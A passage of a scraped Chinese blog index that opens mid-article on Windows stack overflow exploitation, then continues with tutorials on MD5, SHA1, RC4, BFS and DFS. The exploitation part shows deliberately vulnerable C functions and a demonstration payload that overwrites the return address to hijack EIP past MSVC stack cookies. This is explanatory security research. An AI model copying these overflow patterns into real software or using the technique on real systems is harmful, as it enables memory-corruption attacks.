mov ecx,dword ptr ss:[ebp-4] mov edx,dword ptr ss:[ebp-8] mov dword ptr ds:[ecx],edx mov esp,ebp pop ebp ret 如您所见，MSVC已经从函数中删除了栈Cookie。同时，MSVC还将Buf数组放在了内存的最低区域，这违背了其典型的安全策略；如果缓冲区未被引用，它将不考虑GS缓冲区的安全重排序规则。这样就提出了一个有趣的问题：何谓引用？令人惊讶的是，答案并不像我们所期望的那样（引用就是函数中对变量的任何使用）。针对某些类型的变量使用并不能算作引用，因此不会影响变量的排序。 12345678910void Test() &#123; uint8_t Buf[16]&#125;; uint32_t dwVar1 = 1; uint32_t* pdwVar2 = &amp;gdwGlobalVar; Buf[0] = &#x27;A&#x27;; Buf[1] = &#x27;B&#x27;; Buf[2] = &#x27;C&#x27;; *pdwVar2 = dwVar1; &#125; 在上面的例子中，我们希望Buf被放置在内存的第一个（最高）槽（slot）中，因为它被引用了三次，而dwVar1和pdwVar2各只被引用了两次。这个函数的汇编代码与此相矛盾。 1234567891011121314151617181920push ebp mov ebp,esp sub esp,18 mov dword ptr ss:[ebp-8],1 mov dword ptr ss:[ebp-4], mov eax,1 imul ecx,eax,0 mov byte ptr ss:[ebp+ecx-18],41 mov edx,1 shl edx,0 mov byte ptr ss:[ebp+edx-18],42 mov eax,1 shl eax,1 mov byte ptr ss:[ebp+eax-18],43 mov ecx,dword ptr ss:[ebp-4] mov edx,dword ptr ss:[ebp-8] mov dword ptr ds:[ecx],edx mov esp,ebp pop ebp ret 尽管Buf是一个数组，而且比其他任何一个局部变量使用得更多，但是，它却被保存在栈内存的最低处EBP–0x18。上面的汇编代码的另一个有趣的细节是，MSVC没有给上面的函数添加安全Cookie检查。这就意味着，该返回地址仍会受到经典栈溢出以及任意写入漏洞的影响。 越界写入漏洞 12345678910111213141516171819202122#include&lt;Windows.h&gt;#include &lt;cstdint&gt;#include&lt;tchar.h&gt; uint8_t Exploit[] = &quot;AAAAAAAAAAAAAAAA&quot; // 16 bytes for buffer length &quot;\\xde\\xc0\\xad\\xde&quot; // New EIP 0xdeadc0de &quot;\\x1c\\xff\\x19\\x00&quot;; // 0x0019FF1c uint32_t gdwGlobalVar = 0; void OverflowOOBW(uint8_t* pInputBuf, uint32_t dwInputBufSize) &#123; uint8_t Buf[16]; uint32_t dwVar1 = 1; uint32_t* pdwVar2 = &amp;gdwGlobalVar; for (uint32_t dwX = 0; dwX &lt; dwInputBufSize; dwX++) &#123; Buf[dwX] = pInputBuf[dwX]; &#125; *pdwVar2 = dwVar1; &#125; 编译并执行上面的代码会导致一个没有栈Cookies和没有进行安全的变量排序的函数，这样的话，攻击者就可以通过精确覆盖0x0019FF1c处的返回地址来劫持EIP（在本例中，我已经禁用了ASLR）。 根据这些实验，我们可以得出如下所示的结论： MSVC中存在一个安全漏洞：错误地评估了一个函数对栈溢出攻击的潜在敏感性。 这个安全漏洞源于MSVC使用某种形式的内部引用次数来决定变量顺序，而当一个变量的引用次数为零时，它被排除在常规的安全排序和栈Cookie安全缓解措施之外（即使它是一个GS缓冲区）。 按索引读&#x2F;写数组不计入引用次数。因此，以这种方式访问数组的函数将缺乏针对栈溢出漏洞的保护。 对于可能无法适当防止栈溢出的代码模式，我还有几个其他的想法，首先是结构体&#x2F;类的概念。虽然函数栈帧内的变量排序没有标准化或约定俗成（完全由编译器决定），但对于结构体来说，情况就不一样了；编译器必须精确地遵循源代码中声明变量的顺序。因此，如果一个结构体中包含一个数组，后面还有额外的变量，这些变量就无法安全地重新排序，因此，可能会因溢出而被破坏。 12345678910111213struct MyStruct &#123; char Buf[16]; uint32_t dwVar1; uint32_t *pdwVar2; &#125;; void OverflowStruct(uint8_t* pInputBuf, uint32_t dwInputBufSize) &#123; struct MyStruct TestStruct = &#123; 0 &#125;; TestStruct.dwVar1 = 1; TestStruct.pdwVar2 = &amp;gdwGlobalVar; memcpy(TestStruct.Buf, pInputBuf, dwInputBufSize); *TestStruct.pdwVar2 = TestStruct.dwVar1; &#125; 上面用于结构体的概念同样也适用于C++类，前提是它们被声明为局部变量并在栈上分配内存空间。 1234567891011121314class MyClass &#123; public: char Buf[16]; uint32_t dwVar1; uint32_t* pdwVar2; &#125;; void OverflowClass(uint8_t* pInputBuf, uint32_t dwInputBufSize) &#123; MyClass TestClass; TestClass.dwVar1 = 1; TestClass.pdwVar2 = &amp;gdwGlobalVar; memcpy(TestClass.Buf, pInputBuf, dwInputBufSize); *TestClass.pdwVar2 = TestClass.dwVar1; &#125; 当涉及到类时，一个额外的攻击手法是破坏其vtable指针。这些vtable包含指向可执行代码的其他指针，这些可执行代码可以在RET指令之前通过被破坏的类的方法进行调用，从而提供了一种通过破坏局部变量来劫持EIP的新方法，而无需使用任意写入原语。 最后一个容易被局部变量破坏的代码模式的例子是使用运行时栈分配函数，如_alloca。由于这类函数的内存分配过程，是在函数的栈帧已经建立后，通过减去ESP来实现的，因此，这类函数分配的内存将始终处于较低的栈内存中，所以无法重新排序或免受此类攻击的威胁。 1234567void OverflowAlloca(uint8_t* pInputBuf, uint32_t dwInputBufSize) &#123; uint32_t dwValue = 1; uint32_t* pgdwGlobalVar = &amp;gdwGlobalVar; char* Buf = (char*)_alloca(16); memcpy(Buf, pInputBuf, dwInputBufSize); *pgdwGlobalVar = dwValue; &#125; 请注意，尽管上面的函数中没有数组，但MSVC足够聪明，它知道只要使用了_alloca函数就有必要在生成的函数代码中放入栈Cookie。 这里讨论的技术代表了一种现代Windows的栈溢出的攻击面，到目前为止，还没有明确的安全缓解措施。然而，它们的可靠利用依赖于这里讨论的特定代码模式以及（在任意写入的情况下）一个链式内存泄漏原语。 小结对于栈溢出漏洞，虽然现代的操作系统已经提供了许多防御机制，但在今天的Windows应用程序中仍然存在并且可被利用。如果存在非Safeseh模块，那么利用这种溢出漏洞就比较容易，因为还没有哪种默认的安全缓解机制强大到可以防止局部变量破坏而导致的任意写入攻击。就目前来说，防御这类攻击的最强机制是ASLR，为了绕过这种机制，攻击者需要借助于非ASLR模块或内存泄漏漏洞。正如我们在这篇文章中所展示的那样，非Safeseh模块和非ASLR模块在如今的Windows 10系统以及许多第三方应用程序中仍不乏足迹。 与过去相比，尽管栈溢出漏洞的利用技术变得愈加复杂，但与堆中的其他内存破坏类型的漏洞相比，栈溢出是最容易理解的一个。","categories":[{"name":"PWN","slug":"PWN","permalink":"https://qianmuoy.github.io/categories/PWN/"}],"tags":[]},{"title":"MD5","slug":"MD5","date":"2023-04-01T12:50:07.000Z","updated":"2024-02-04T12:36:04.515Z","comments":true,"path":"2023/04/01/MD5/","link":"","permalink":"https://qianmuoy.github.io/2023/04/01/MD5/","excerpt":"","text":"加密MD5是一种哈希算法，任意长度的输入经过处理后输出为128位的信息，且尽量使结果不冲突和信息不可逆。MD5以512位为一个分组处理输入，每个分组分成16个32位的子分组，经过处理后，输出四个32位分组，这四个32位分组级联后生成一个128位的MD5值 MD5的特点单向散列算法：将一种任意长度的消息数据压缩到某一固定长度，该过程是不可逆的。 MD5 Message Digest Algorithm 是对任意长度的消息进行运算，产生一个128位的消息摘要。 压缩性:任意长度的数据，算出的MD5值长度都是固定的。 容易计算:从原数据计算出MD5值很容易。 抗修改性:对原数据进行任何改动，哪怕只修改1个字节，所得到的MD5值都有很大区别。 强抗碰撞:已知原数据和其MD5值，想找到一个具有相同MD5值的数据(即伪造数据)是非常困难的。 MD5的作用是让大容量信息在用数字签名软件签署私人密钥前被”压缩”成一种保密的格式(就是把一个任意长度的字节串变换成一定长的十六进制数字串)。 在内存中是小端序存储 将原始数据每512bits为一个分组 (这就是前面要求填充到512整数倍的原因)，对每组分别进行处理 操作过程数据末尾填充0x80 计算原始数据的长度 用零填充直到数据的字节数是64的倍数为止 把数据进行分组一组为64(512位)个字节 进行计算最终获得一个16个字节的MD5码 计算过程1.进行组一数据的计算 定义临时变量并赋值 a &#x3D; A; b &#x3D; B; c &#x3D; C; d &#x3D; D &#x2F;&#x2F; 1 2 3 4 2.计算a的值 &#x2F;&#x2F;4 10 2 3 a &#x3D; (a + F + K[i] + M[g]) &lt;&lt; s[i]) + b; 3.交换数据 b &#x3D; a c &#x3D; b d &#x3D; c a &#x3D; d 循环2.3两个步骤64次 4.计算 A &#x3D; A + a;B &#x3D; B + b;C &#x3D; C + c;D &#x3D; D + d; 5.跟新1.中a，b，c，d计算组二数据 当完成最后一组数据的计算获得 A；B；C；D以小端序组合获得最终16个字节就是MD5 如：A1A2A3A4 B1B2B3B4 C1C2C3C4 D1D2D3D4 A4A3A2A1B4B3B2B1C4C3C2C1D4D3D2D1 共循环64次 F的计算 0-15 F &#x3D; (b&amp;c)|((b)&amp;d) 16-31 F &#x3D; (d&amp;b)|((d)&amp;c) 32-47 F &#x3D; b^c^d 48-63 F &#x3D; c^(b|(~d)) K[i]的计算 这是一个64个常量组成的数组在循环过程中依次获取 S[i]的计算 这是一个64(每组都乘4)个常量组成的数组在循环过程中依次获取 M[g]的计算 0-15 从原始数据的第i个4个字节(小端序) 39 31 31 4d 61 6f 48 61 69 80 第一次使用 4d 31 31 39 第二次使用 61 48 6f 41 16-31 从原始数据的第(5i+1)%16个4个字节(小端序) 32-47 从原始数据的第(3i+5)%16个4个字节(小端序) 48-63 从原始数据的第(7*i)%16个4个字节(小端序)","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://qianmuoy.github.io/categories/Crypto/"}],"tags":[]},{"title":"BFS","slug":"BFS","date":"2023-04-01T12:39:09.000Z","updated":"2024-02-04T11:54:53.235Z","comments":true,"path":"2023/04/01/BFS/","link":"","permalink":"https://qianmuoy.github.io/2023/04/01/BFS/","excerpt":"","text":"BFS解决迷宫问题迷宫问题Crawling in process… Crawling failed Time Limit:1000MS Memory Limit:65536KB 64bit IO Format:%I64d &amp; %I64uSubmit StatusDescription 定义一个二维数组： int maze [5] [5] &#x3D; { 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, }; 它表示一个迷宫，其中的1表示墙壁，0表示可以走的路，只能横着走或竖着走，不能斜着走，要求编程序找出从左上角到右下角的最短路线。 输入 一个5 × 5的二维数组，表示一个迷宫。数据保证有唯一解。 输出 左上角到右下角的最短路径 解题思路使用结构体来保存横纵坐标即(x,y)，输出没要求距离长度，定义一个step保存长度也可以 创建一个队列 queue q; 12345678910while(q不为空)&#123;if(到达右下角)&#123; 输出或是退出&#125;else&#123; for()&#123; 枚举四个方向 合适的就入队 &#125;&#125;q.pop(); //出队列&#125; 如何输出路径呢？ 这里我们使用一个 print() 函数， 在函数内 递归调用 print()函数，直到为左上角就输出， 怎么调用前一个呢？ 我们可以再创建一个结构体的二维数组，每个对应位置存放的是，它爸爸的x,y坐标 Step pre[5] [5]; 在 q.push(); 的时候 pre[nx] [ny].x &#x3D; s.x,pre[nx] [ny].y &#x3D; s.y; 这样pre[][] 当前对应的[nx] [ny]，就应该存放 它爸爸的x,y 输出： 123456789void print(int x,int y)&#123; if(x == 0 &amp;&amp; y == 0)&#123; printf(&quot;(0, 0)\\n&quot;); return; &#125; print(pre[x] [y].x,pre[x] [y].y); printf(&quot;(%d, %d)\\n&quot;,x,y); return;&#125; 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include&lt;iostream&gt;#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;queue&gt;using namespace std;struct Step&#123; int x,y; int steps;&#125;;int a[5][5],book[5][5]=&#123;0&#125;;int Next[4][2] = &#123;&#123;0,1&#125;,&#123;1,0&#125;,&#123;0,-1&#125;,&#123;-1,0&#125;&#125;;queue&lt;Step&gt; q;Step pre[5][5];void print(int x,int y)&#123; if(x==0&amp;&amp;y==0)&#123; printf(&quot;(0, 0)\\n&quot;); return; &#125; print(pre[x][y].x,pre[x][y].y); printf(&quot;(%d, %d)\\n&quot;,x,y); return;&#125;void bfs()&#123; Step nd; nd.x=0,nd.y=0,nd.steps=0; book[0][0] = 1; q.push(nd); while(!q.empty())&#123; Step s = q.front(); if(s.x == 4 &amp;&amp; s.y == 4)&#123; print(4,4); break; &#125; for(int i=0;i&lt;4;i++)&#123; int nx = s.x + Next[i][0], ny = s.y + Next[i][1], step = s.steps+1; if((nx&lt;=4&amp;&amp;nx&gt;=0) &amp;&amp; (ny&lt;=4&amp;&amp;ny&gt;=0) &amp;&amp; book[nx][ny]==0 &amp;&amp; a[nx][ny]==0)&#123; Step p; p.x=nx,p.y=ny,p.steps=step; book[nx][ny] = 1; pre[nx][ny].x = s.x,pre[nx][ny].y = s.y; q.push(p); &#125; &#125; q.pop(); &#125;&#125;int main()&#123; for(int i=0;i&lt;5;i++) for(int j=0;j&lt;5;j++) cin&gt;&gt;a[i][j]; bfs(); return 0; &#125; 学习代码一般来说，是不需要输出图像的。这时，代码可以简化，更便于学习 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758#include &lt;iostream&gt;#include &lt;queue&gt;using namespace std;const int N = 110;int n, m;int g[N][N]; // 迷宫int d[N][N]; // 到起点的距离bool st[N][N]; // 标记是否已经走过struct Point &#123; int x, y;&#125;;// 四个方向int dx[] = &#123;-1, 0, 1, 0&#125;, dy[] = &#123;0, 1, 0, -1&#125;;// BFS模板int bfs() &#123; queue&lt;Point&gt; q; q.push(&#123;0, 0&#125;); st[0][0] = true; d[0][0] = 0; while (q.size()) &#123; auto t = q.front(); q.pop(); // 如果到达终点，返回距离 if (t.x == n - 1 &amp;&amp; t.y == m - 1) return d[n - 1][m - 1]; // 四个方向 for (int i = 0; i &lt; 4; i++) &#123; int a = t.x + dx[i], b = t.y + dy[i]; // 判断是否越界或者障碍物 if (a &gt;= 0 &amp;&amp; a &lt; n &amp;&amp; b &gt;= 0 &amp;&amp; b &lt; m &amp;&amp; g[a][b] == 0 &amp;&amp; !st[a][b]) &#123; q.push(&#123;a, b&#125;); st[a][b] = true; d[a][b] = d[t.x][t.y] + 1; // 到起点的距离加一 &#125; &#125; &#125; return -1; // 如果无法到达终点，返回-1&#125;int main() &#123; cin &gt;&gt; n &gt;&gt; m; for (int i = 0; i &lt; n; i++) for (int j = 0; j &lt; m; j++) cin &gt;&gt; g[i][j]; cout &lt;&lt; bfs() &lt;&lt; endl; return 0;&#125;","categories":[{"name":"Algorithms","slug":"Algorithms","permalink":"https://qianmuoy.github.io/categories/Algorithms/"}],"tags":[]},{"title":"SHA1","slug":"SHA1","date":"2023-04-01T12:27:59.000Z","updated":"2024-02-04T12:33:41.531Z","comments":true,"path":"2023/04/01/SHA1/","link":"","permalink":"https://qianmuoy.github.io/2023/04/01/SHA1/","excerpt":"","text":"SHA1安全哈希算法（Secure Hash Algorithm）主要适用于数字签名标准（Digital Signature Standard DSS） 里面定义的数字签名算法（Digital Signature Algorithm DSA）。 该算法输入报文的长度不限，产生的输出是一个160位的报文摘要。输入是按512 位的分组进行处理的。SHA-1是不可逆的、防冲突，并具有良好的雪崩效应。 算法： 1.数据末尾填充0x80 39 31 31 4d 61 6f 48 61 69 “911MaoHai” 39 31 31 4d 61 6f 48 61 69 80 9 * 8 &#x3D; 72 2.计算原始数据的长度 72 &#x3D; 0x00 00 00 00 00000048 39 31 31 4d 61 6f 48 61 69 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 大端序的数据长度 3.用零填充直到数据的字节数是64的倍数为止 4.把数据进行分组一组为64(512位)个字节 进行计算最终获得一个20个字节的SHA1码 5.初始化五个值 小端序 A &#x3D; 0x67452301; B &#x3D; 0xEFCDAB89; C &#x3D; 0x98BADCFE; D &#x3D; 0x10325476; E &#x3D; 0xC3D2E1F0; 6.将我们分好的64个字节扩充为320个字节 4个字节为一组循环80次 7.进行组一数据的计算 定义临时变量并赋值 a &#x3D; A; b &#x3D; B; c &#x3D; C; d &#x3D; D; e &#x3D; E 8.计算e的值 e &#x3D; (a &lt;&lt; 5)+ f + e + k + w[i]; 9.计算b的值 b &#x3D; b&lt;&lt;30 10.交换数据 b &#x3D; a c &#x3D; b d &#x3D; c e &#x3D; d a &#x3D; e 循环8.9.10三个步骤80次 11.计算 A &#x3D; A + a;B &#x3D; B + b;C &#x3D; C + c;D &#x3D; D + d;E &#x3D; E + e 10.跟新7.中a，b，c，d，e计算组二数据 当完成最后一组数据的计算获得 A；B；C；D；E以da端序组合获得最终20个字节(160Bits)就是SHA1码 如：A1A2A3A4 B1B2B3B4 C1C2C3C4 D1D2D3D4 E1E2E3E4 A1A2A3A4B1B2B3B4C1C2C3C4D1D2D3D4E1E2E3E4 数据扩充到320个字节 将源数据的64个字节直接赋值到新的空间中 取出当前位置的前面第三个4字节 ^ 取出当前位置的前面第八个4字节 ^ 取出当前位置的前面第十四个4字节 ^ 取出当前位置的前面第十六个4字节 循环左移一位 结果大端序存储 共循环64次 39 31 31 4d 61 6f 48 61 69 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 48 75 5A DF A0 —-后面的256个字节需要填充 00 00 00 00 ^ 00 00 00 00 ^ 00 00 00 00 ^ 61 69 80 00 &lt;&lt; 1 &#x3D; 75 5A DF A0 共循环80次 f、k的计算 0-19 f &#x3D; d^(b&amp;(c^d)) k &#x3D; 0x5A827999 20-39 f &#x3D; b^c^d k &#x3D; 0x6ED9EBA1 40-59 f &#x3D; (b&amp;c)|(b&amp;d)|(c&amp;d) k &#x3D; 0x8F1BBCDC 60-79 f &#x3D; b^c^d k &#x3D; 0xCA62C1D6 共循环80次 w[i]的计算 数据扩充后的第i个4个字节整型 大端序取出 第一次 39 31 31 4d 第二次 4d 61 6f 48 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253Note: All variables are unsigned 32 bits and wrap modulo 232 when calculatingInitial variables:h0 := 0x67452301h1 := 0xEFCDAB89h2 := 0x98BADCFEh3 := 0x10325476h4 := 0xC3D2E1F0Pre-processing:append the bit &#x27;1&#x27; to the messageappend k bits &#x27;0&#x27;, where k is the minimum number &gt;= 0 such that the resulting message length (in bits) is congruent to 448(mod 512)append length of message (before pre-processing), in bits, as 64-bit big-endian integerProcess the message in successive 512-bit chunks:break message into 512-bit chunksfor each chunk break chunk into sixteen 32-bit big-endian words w[i], 0 ≤ i ≤ 15 Extend the sixteen 32-bit words into eighty 32-bit words: for i from 16 to 79 w[i] := (w[i-3] xor w[i-8] xor w[i-14] xor w[i-16]) leftrotate 1 Initialize hash value for this chunk: a := h0 b := h1 c := h2 d := h3 e := h4 Main loop: for i from 0 to 79 if 0 ≤ i ≤ 19 then f := (b and c) or ((not b) and d) k := 0x5A827999 else if 20 ≤ i ≤ 39 f := b xor c xor d k := 0x6ED9EBA1 else if 40 ≤ i ≤ 59 f := (b and c) or (b and d) or(c and d) k := 0x8F1BBCDC else if 60 ≤ i ≤ 79 f := b xor c xor d k := 0xCA62C1D6 temp := (a leftrotate 5) + f + e + k + w[i] e := d d := c c := b leftrotate 30 b := a a := temp Add this chunk&#x27;s hash to result so far: h0 := h0 + a h1 := h1 + b h2 := h2 + c h3 := h3 + d h4 := h4 + eProduce the final hash value (big-endian):digest = hash = h0 append h1 append h2 append h3 append h4","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://qianmuoy.github.io/categories/Crypto/"}],"tags":[]},{"title":"DFS","slug":"DFS","date":"2023-04-01T12:15:41.000Z","updated":"2024-02-04T11:54:59.014Z","comments":true,"path":"2023/04/01/DFS/","link":"","permalink":"https://qianmuoy.github.io/2023/04/01/DFS/","excerpt":"","text":"DFS一.深度优先搜索（dfs）1.什么叫dfs深度优先搜索类似于树的先序遍历； 是利用栈或者递归的方式实现的，体现出了后进先出的特点； 通俗来说就是一次访问一条路，一直朝着一个方向探索，直到遇到死路退回到前一个分支，继续探索； 一般来说，深度搜索解决的问题主要为寻求所有解和连通性。 2.遍历过程（1）从图中某个初始顶点v出发，首先访问初始顶点v。 （2）然后依次从v的未被访问的邻接点w，再从w出发进行深度优先遍历，直到图中所有与v有路径相通的的顶点都被访问过为止。 3.算法设计解决问题:（1）如何确定一个顶点是否访问过？ 设置一个visited[]全局数组， visited[i]&#x3D;0表示顶点i没有访问; visited[i]&#x3D;1表示顶点i已经访问过。 （在图中也可以修改图本身来实现） 4.dfs算法模板1234567891011121314151617void dfs(int s)&#123; if(找到解了) &#123; 相应的操作； return ； &#125; 尝试每一种可能 &#123; if(满足条件) &#123; 标记走过； 进行下一步dfs； 回溯一步； //恢复原状态 &#125; &#125;&#125; 代码 最短路径（迷宫问题） 123456789101112131415161718192021222324252627282930313233343536373839404142 //用dfs来计算最短路径#include&lt;stdio.h&gt;int r,c,num=10000;char map[41][41];int dx[]=&#123;1,-1,0,0&#125;;int dy[]=&#123;0,0,1,-1&#125;;void dfs(int x,int y,int k)&#123; if(x==r&amp;&amp;y==c) &#123; if(num&gt;k) &#123; num=k; &#125; &#125; for(int i=0;i&lt;4;i++) &#123; int nx=x+dx[i]; int ny=y+dy[i]; if(nx&gt;=1&amp;&amp;nx&lt;=c&amp;&amp;ny&gt;=1&amp;&amp;ny&lt;=r&amp;&amp;map[ny][nx]==&#x27;.&#x27;) &#123; map[ny][nx]=&#x27;#&#x27;; dfs(nx,ny,k+1); map[ny][nx]=&#x27;.&#x27;; &#125; &#125;&#125;int main()&#123; scanf(&quot;%d%d&quot;,&amp;r,&amp;c); for(int i=1;i&lt;=r;i++) &#123; for(int j=1;j&lt;=c;j++) &#123; scanf(&quot; %c&quot;,&amp;map[i][j]); &#125; &#125; map[1][1]=&#x27;#&#x27;; dfs(1,1,1); printf(&quot;%d&quot;,num);&#125; 2. 路径判断123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960//dfs遍历是否能够从(ha,la)到(hb,lb)#include&lt;stdio.h&gt;#include&lt;string.h&gt;int dx[]=&#123;1,-1,0,0&#125;;int dy[]=&#123;0,0,1,-1&#125;;int n,ha,la,hb,lb,nx,ny;bool flag;char map[200][200];void dfs(int x,int y)&#123; for(int i=0;i&lt;4;i++) &#123; nx=x+dx[i]; ny=y+dy[i]; if(nx&gt;=0&amp;&amp;nx&lt;n&amp;&amp;ny&gt;=0&amp;&amp;ny&lt;n&amp;&amp;map[nx][ny]==&#x27;.&#x27;) &#123; map[nx][ny]=&#x27;#&#x27;; if(nx==hb&amp;&amp;ny==lb) &#123; printf(&quot;YES\\n&quot;); flag=true; break; &#125; else dfs(nx,ny); &#125; &#125;&#125;int main()&#123; int k; scanf(&quot;%d&quot;,&amp;k); for(int i=0;i&lt;k;i++) &#123; flag=false; scanf(&quot;%d&quot;,&amp;n); memset(map,&#x27;#&#x27;,sizeof(map)); for(int j=0;j&lt;n;j++) for(int h=0;h&lt;n;h++) &#123; scanf(&quot; %c&quot;,&amp;map[j][h]); &#125; scanf(&quot;%d%d%d%d&quot;,&amp;ha,&amp;la,&amp;hb,&amp;lb); if(map[ha][la]==&#x27;#&#x27;||map[hb][lb]==&#x27;#&#x27;) &#123; printf(&quot;NO\\n&quot;); continue; &#125; else &#123; map[ha][la]=&#x27;#&#x27;; //标记起点走过 dfs(ha,la); &#125; if(!flag) printf(&quot;NO\\n&quot;); &#125; return 0;&#125;","categories":[{"name":"Algorithms","slug":"Algorithms","permalink":"https://qianmuoy.github.io/categories/Algorithms/"}],"tags":[]},{"title":"RC4","slug":"RC4","date":"2023-04-01T12:08:51.000Z","updated":"2024-02-04T12:33:32.144Z","comments":true,"path":"2023/04/01/RC4/","link":"","permalink":"https://qianmuoy.github.io/2023/04/01/RC4/","excerpt":"","text":"RC4什么是RC4 ? RC4加密算法是大名鼎鼎的RSA三人组中的头号人物Ron Rivest在1987年设计的密钥长度可变的流加密算法簇，之所以称其为簇，是由于其核心部分的S-box长度可为任意，但一般为256字节。 在密码学中，RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。它加解密使用相同的密钥，因此也属于对称加密算法。所谓对称加密，就是加密和解密的过程是一样的。RC4是有线等效加密（WEP）中采用的加密算法，也曾经是TLS可采用的算法之一。 RC4已经成为一些常用的协议和标准的一部分，如1997年的WEP和2003&#x2F;2004年无线卡的WPA; 和1995年的SSL，以及后来1999年的TLS。让它如此广泛分布和使用的主要因素是它不可思议的简单和速度，不管是软件还是硬件，实现起来都十分容易。 基本原理对明文使用同一个密钥异或两次最后得到的是原文 加密：原文和Keystream进行异或得到密文 解密：密文和Keystream进行异或得到原文 流程图解 生成秘钥流（KeyStream）从上图可以看出来，RC4加密原理很简单，只需要一个KeyStream与明文进行异或即可，密钥流的长度和明文的长度是对应的。RC4算法的的主要代码还是在于如何生成秘钥流。 密钥流的生成由两部分组成： KSA（the Key-Scheduling Algorithm) PRGA(the Pseudo-Random Generation Algorithm) 利用Key生成S盒——The key-scheduling algorithm (KSA)1234567891011/* 得到S-box */int i = 0;for (i = 0; i &lt; 256; i++) &#123; S[i] = i; T[i] = puc_key[i % key_length];&#125; for (i = 0; i &lt; 256; i++) &#123; j = (j + S[i] + T[i]) % 256; swap_uchar(&amp;S[i], &amp;S[j]); //交换S[i]和S[j]&#125; 利用S盒生成密钥流——The pseudo-random generation algorithm(PRGA) 12345678910111213/* 生成密钥流 Keystream */int i = 0;int j = 0;int t = 0;unsigned long k = 0; for (k = 0; k &lt; ul_data_length; k++) &#123; i = (i + 1) % 256; j = (j + puc_sbox[i]) % 256; swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]); t = (puc_sbox[i] + puc_sbox[j]) % 256; puc_key_stream[k] = puc_sbox[t];&#125; 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#include&lt;stdio.h&gt;#include&lt;string.h&gt; #define SBOX_LEN 256 #define rc4_encrypt rc4_crypt#define rc4_decrypt rc4_crypt static inline void swap_uchar(unsigned char *puc_x, unsigned char *puc_y)&#123; *puc_x = *puc_x ^ *puc_y; *puc_y = *puc_x ^ *puc_y; *puc_x = *puc_x ^ *puc_y;&#125; void hexdump(unsigned char *puc_data, int length)&#123; int i = 0; for (i = 0; i &lt; length; i++) &#123; printf(&quot;%02X&quot;, puc_data[i]); if (i &amp;&amp; (i + 1) % 16 == 0) &#123; putchar(&#x27;\\n&#x27;); &#125; &#125; printf(&quot;\\n&quot;);&#125; /** * 利用Key生成S盒 * the Key-Scheduling Algorithm */static void rc4_ksa(unsigned char *puc_sbox, unsigned char *puc_key, int key_length)&#123; int i = 0; int j = 0; char tmp[SBOX_LEN] = &#123;0&#125;; for (i = 0; i &lt; SBOX_LEN; i++) &#123; puc_sbox[i] = i; tmp[i] = puc_key[i % key_length]; &#125; for (i = 0; i &lt; SBOX_LEN; i++) &#123; j = (j + puc_sbox[i] + tmp[i]) % SBOX_LEN; swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]); //交换puc_sbox[i]和puc_sbox[j] &#125;&#125; /** * 利用S盒生成密钥流 * The pseudo-random generation algorithm(PRGA) */static void rc4_prga(unsigned char *puc_sbox, unsigned char *puc_key_stream, unsigned long ul_data_length)&#123; int i = 0; int j = 0; int t = 0; unsigned long k = 0; for (k = 0; k &lt; ul_data_length; k++) &#123; i = (i + 1) % SBOX_LEN; j = (j + puc_sbox[i]) % SBOX_LEN; swap_uchar(&amp;puc_sbox[i], &amp;puc_sbox[j]); t = (puc_sbox[i] + puc_sbox[j]) % SBOX_LEN; /* 为了更清晰理解rc4算法流程，此处保存keystream，不直接进行XOR运算 */ puc_key_stream[k] = puc_sbox[t]; &#125;&#125; /* 加解密 */void rc4_crypt(unsigned char *puc_data, unsigned char *puc_key_stream, unsigned long ul_data_length)&#123; unsigned long i = 0; /* 把PRGA算法放在加解密函数中可以不需要保存keystream */ for (i = 0; i &lt; ul_data_length; i++) &#123; puc_data[i] ^= puc_key_stream[i]; &#125;&#125; int main(int argc, char *argv[])&#123; unsigned char sbox[SBOX_LEN] = &#123;0&#125;; char key[SBOX_LEN] = &#123;&quot;abcdefghijklmnopqrstuvwxyz&quot;&#125;; //秘钥内容随便定义 char data[512] = &quot;lsRJ@.0 lvfvr#9527&quot;; unsigned char puc_keystream[512] = &#123;0&#125;; unsigned long ul_data_length = strlen(data); printf(&quot;key=%s, length=%d\\n\\n&quot;, key, strlen(key)); printf(&quot;Raw data string:%s\\n&quot;, data); printf(&quot;Raw data hex:\\n&quot;); hexdump(data, ul_data_length); /* 生成S-box */ rc4_ksa(sbox, (unsigned char *)key, strlen(key)); /* 生成keystream并保存,S-box也会被更改 */ rc4_prga(sbox, puc_keystream, ul_data_length); printf(&quot;S-box final status:\\n&quot;); hexdump(sbox, sizeof(sbox)); printf(&quot;key stream:\\n&quot;); hexdump(puc_keystream, ul_data_length); /* 加密 */ rc4_encrypt((unsigned char*)data, puc_keystream, ul_data_length); printf(&quot;cipher hexdump:\\n&quot;); hexdump(data, ul_data_length); /* 解密 */ rc4_decrypt((unsigned char*)data, puc_keystream, ul_data_length); printf(&quot;decypt data:%s\\n&quot;, data); return 0;&#125; 运行示例： 123456789101112131415161718192021222324252627282930313233┌──(shelmean㉿ubuntu)-[~/rc4]└─$ ./rc4key=abcdefghijklmnopqrstuvwxyz, length=26 Raw data string:lsRJ@.0 lvfvr#9527Raw data hex:6C73524A402E30206C766676722339353237S-box final 